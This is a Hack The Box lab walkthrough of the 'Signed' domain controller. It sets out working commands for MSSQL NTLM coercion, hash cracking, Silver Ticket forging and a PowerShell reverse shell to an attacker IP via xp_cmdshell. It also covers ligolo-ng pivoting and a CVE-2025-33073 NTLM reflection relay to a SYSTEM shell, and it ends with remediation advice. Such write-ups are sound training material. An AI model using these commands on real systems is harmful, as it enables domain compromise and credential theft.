# Signed — HTB Walkthrough

> **Note on redaction.** IP addresses and attacker-side values (e.g. `10.10.15.49`) are from a single lab session and change per spawn. Flags are shown truncated/for reference only. Credentials shown were recovered during the engagement on an authorized lab target.

---

## Overview

| Field | Value |
|---|---|
| Machine | Signed |
| Platform | Hack The Box (Active Directory) |
| OS | Windows Server 2019 (Build 17763) |
| Role | Domain Controller — `DC01.SIGNED.HTB` |
| Domain | `SIGNED.HTB` (SID `S-1-5-21-4088429403-1159899800-2753317549`) |
| Given foothold | `scott : Sm230#C5NatH` (MSSQL login) |
| Exposed port | **1433/tcp only** (host firewall) |

**Attack chain**

1. MSSQL login `scott` → `xp_dirtree` NTLM coercion of the SQL service account.
2. Crack captured NetNTLMv2 → `SIGNED\mssqlsvc : purPLE9795!@`.
3. `mssqlsvc` has a SPN and the `SIGNED\IT` domain group is `sysadmin` → forge a **Silver Ticket** that injects the IT group SID → MSSQL `sysadmin`.
4. Enable and use `xp_cmdshell` → reverse shell as `SIGNED\mssqlsvc` → **user.txt**.
5. Pivot with ligolo-ng; identify the real theme: **SMB signing**. Client-side signing is **not** enforced → **CVE-2025-33073** (SMB client NTLM reflection EoP).
6. Coerce `DC01$`, reflect the authentication. SMB relay is blocked by server signing, so relay to **WinRM-HTTPS (5986)** instead → shell as **`NT AUTHORITY\SYSTEM`** → **root.txt**.

---

## Enumeration

### Port scan

Top-1000 and a full `-p-` sweep both return a single open port — a hardened Domain Controller behind a host firewall.

```bash
nmap -p- --min-rate 5000 -T4 -oN nmap_full.txt 10.129.242.173
```

```
PORT     STATE SERVICE
1433/tcp open  ms-sql-s   Microsoft SQL Server 2022 (16.00.1000.00 RTM)
```

The `ms-sql-ntlm-info` script leaks the AD identity: domain `SIGNED.HTB`, host `DC01`. Everything (SMB, LDAP, Kerberos, WinRM) is filtered inbound, so all remote interaction funnels through MSSQL until we have a foothold and a tunnel.

Add the host entry:

```
10.129.242.173  signed.htb dc01.signed.htb
```

### MSSQL as `scott`

`scott` is a **SQL login** (not a domain account), so authentication requires SQL auth (`--local-auth`):

```bash
nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth
```

Enumeration inside MSSQL shows `scott` is low-privileged (`guest`, `public`), **not** `sysadmin`, with no impersonation rights and no external linked servers. The classic SQL privilege-escalation paths are closed. However, `scott` **can execute** `xp_dirtree` and `xp_fileexist`:

```sql
SELECT HAS_PERMS_BY_NAME('master.sys.xp_dirtree','OBJECT','EXECUTE');  -- 1
```

That is enough to coerce the SQL service account into authenticating to us.

---

## Initial Access

### NTLM coercion via `xp_dirtree`

Start a capture listener, then force MSSQL to reach out to an attacker UNC path:

```bash
sudo responder -I tun0
```

```sql
-- in impacket-mssqlclient scott:'Sm230#C5NatH'@10.129.242.173
EXEC master..xp_dirtree '\\10.10.15.49\x', 1, 1;
```

> The path must be a quoted string passed to `EXEC`; a bare UNC path raises SQL error `102`.

Responder captures the NetNTLMv2 hash of **`SIGNED\mssqlsvc`** — the SQL service account, which is a **domain user** (not a machine/virtual account).

### Crack the hash

```bash
hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
```

```
SIGNED\mssqlsvc : purPLE9795!@
```

### Silver Ticket → MSSQL `sysadmin`

Authenticating as `mssqlsvc` over Windows auth is still only `guest`. The important finding is the `sysadmin` role membership:

```
sysadmin <= sa, SIGNED\IT, NT SERVICE\...
```

`SIGNED\IT` is a **domain group**, and `mssqlsvc` owns a Service Principal Name (`MSSQLSvc/dc01.signed.htb`). With the account's key we can forge a Silver Ticket for the MSSQL service and inject the `IT` group SID (RID `1105`) into the PAC. Kerberos to MSSQL travels over 1433, so the filtered KDC (88) is irrelevant.

Collect the domain SID and group RID via `SUSER_SID`, compute the NT hash, then:

```bash
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb -spn MSSQLSvc/dc01.signed.htb:1433 \
  -user-id 500 -groups 513,512,1105 Administrator

export KRB5CCNAME=$PWD/Administrator.ccache
impacket-mssqlclient -k dc01.signed.htb
```

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1
```

---

## User

As `sysadmin` we enable and use `xp_cmdshell`, which runs as the SQL service account `SIGNED\mssqlsvc`:

```
enable_xp_cmdshell
EXEC xp_cmdshell 'whoami';            -- signed\mssqlsvc
```

A PowerShell reverse shell lands a session as `SIGNED\mssqlsvc`:

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient(''10.10.15.49'',8443);..."';
```

```
type C:\Users\mssqlsvc\Desktop\user.txt
```

**user.txt** obtained.

---

## Privilege Escalation

### Pivot with ligolo-ng

The DC's internal services are only reachable locally, so we tunnel. The loopback trick routes `240.0.0.1` through the agent to the DC's `127.0.0.1`, bypassing the host firewall:

```bash
# attacker
sudo ligolo-proxy -selfcert
sudo ip route add 240.0.0.1/32 dev ligolo
# target
.\agent.exe -connect 10.10.15.49:11601 -ignore-cert    # then: session -> start
```

### Finding the real vector: SMB signing

`mssqlsvc` has no `SeImpersonatePrivilege`; there is no enterprise CA (ADCS), no Kerberos delegation, no dangerous ACLs, no LAPS/gMSA, and no privileged group membership. The machine name — **Signed** — points at **SMB signing**. Checking the effective configuration on the DC:

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature   # True  (server)
Get-SmbClientConfiguration | Select RequireSecuritySignature   # False (client)
```

Signing is only half-enforced: the **server** requires it, the **client** does not. A coerced host acts as an SMB *client*, so the gap exposes the DC to **CVE-2025-33073** — a Windows SMB client NTLM reflection vulnerability allowing an authenticated attacker to elevate to SYSTEM over the network.

### CVE-2025-33073 — NTLM reflection

The technique: coerce the DC's machine account (`DC01$`) to authenticate to the attacker through a **marshaled DNS name**. When the name is unmarshaled it resolves to the host's own identity, so the host performs **local authentication**, which reflected back grants SYSTEM.

**1. Add the marshaled DNS record** (ADIDNS, writable by any domain user) pointing at the attacker:

```bash
python3 dnstool.py -u 'signed.htb\mssqlsvc' -p 'purPLE9795!@' \
  --action add --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  --data 10.10.15.49 240.0.0.1
```

**2. Relay — target WinRM-HTTPS, not SMB.** Relaying to SMB fails because the DC's **server** signing is required:

```
[-] Signing is required, attack won't work ...
[-] (SMB): Authenticating against smb://240.0.0.1 as / FAILED
```

WinRM runs over HTTP(S) and does not use SMB signing, so the reflected local-SYSTEM authentication is accepted. ntlmrelayx ships a `WINRMS` client:

```bash
sudo impacket-ntlmrelayx -t winrms://240.0.0.1 -smb2support --no-http-server
```

**3. Coerce the machine account** (`DC01$`, via PetitPotam) through the tunnel, pointing the listener at the marshaled name:

```bash
nxc smb 240.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus \
  -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

The relay authenticates and opens an interactive WinRM shell:

```
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://240.0.0.1 SUCCEED [1]
[*] winrms:///@240.0.0.1 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
```

**4. Connect and read the flag:**

```bash
nc 127.0.0.1 11000
```

```
# whoami
nt authority\system
# type C:\Users\Administrator\Desktop\root.txt
424268e17197ab557ccdddab3afbd4de
```

> Coercion **must** target the machine account `DC01$` (PetitPotam / `coerce_plus`). `xp_dirtree` only coerces the `mssqlsvc` user and would not yield SYSTEM.

**root.txt** obtained.

---

## Remediation

| Finding | Fix |
|---|---|
| MSSQL `xp_dirtree` executable by low-priv login | Revoke `EXECUTE` on `xp_dirtree`/`xp_fileexist` for non-admin principals; restrict outbound SMB from the server. |
| Weak service-account password (`mssqlsvc`) | Use a long, random, managed password (gMSA) for service accounts. |
| Domain group granted SQL `sysadmin` | Scope `sysadmin` to specific admins, not broad groups; monitor Silver Ticket indicators. |
| Service account SPN + known key → Silver Ticket | Rotate keys, prefer AES, enable PAC validation; treat service-account compromise as domain-impacting. |
| SMB signing enforced on server only | Enforce **client *and* server** SMB signing via GPO ("Microsoft network client/server: Digitally sign communications (always)"). |
| Missing patch for CVE-2025-33073 | Apply the June 2025 cumulative update; enforce SMB signing as compensating control. |

---

## MITRE ATT&CK

| Tactic | Technique |
|---|---|
| Credential Access | T1557.001 — LLMNR/NBT-NS & SMB relay (coerced NTLM capture) |
| Credential Access | T1110.002 — Password cracking (NetNTLMv2) |
| Credential Access | T1558.002 — Silver Ticket (forged Kerberos TGS) |
| Execution | T1059.001 — PowerShell; MSSQL `xp_cmdshell` |
| Lateral Movement / Pivot | T1572 — Protocol tunneling (ligolo-ng) |
| Privilege Escalation | T1068 — Exploitation for privilege escalation (CVE-2025-33073) |
| Privilege Escalation | T1187 — Forced authentication (PetitPotam coercion) |
